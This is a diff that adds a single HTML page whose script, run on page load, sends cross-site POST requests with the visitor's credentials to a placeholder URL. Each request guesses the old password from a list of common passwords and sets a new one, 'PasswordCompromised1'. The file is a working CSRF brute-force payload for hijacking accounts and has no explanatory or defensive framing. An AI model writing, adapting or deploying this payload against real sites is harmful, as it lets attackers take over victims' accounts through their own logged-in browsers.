@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body onload="password();">
+
+<script> 
+function password(){
+	var password_array = ["password", "password123", "password12345", "letmein"]; //insert password list here
+	for (x=0; x < password_array.length; x++) {
+		console.log("trying with " + password_array[x]);
+		bruteForce(password_array[x]);
+	}
+};
+
+function bruteForce(password){
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http://<URL>", true);
+	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	xhr.withCredentials = true;
+	var body = "OldPassword=" + password + "&NewPassword=PasswordCompromised1&ConfirmPassword=PasswordCompromised1&UpdatePassword=Submit";
+	xhr.send(body);
+}
+</script>
+
+
+</body>
+</html>
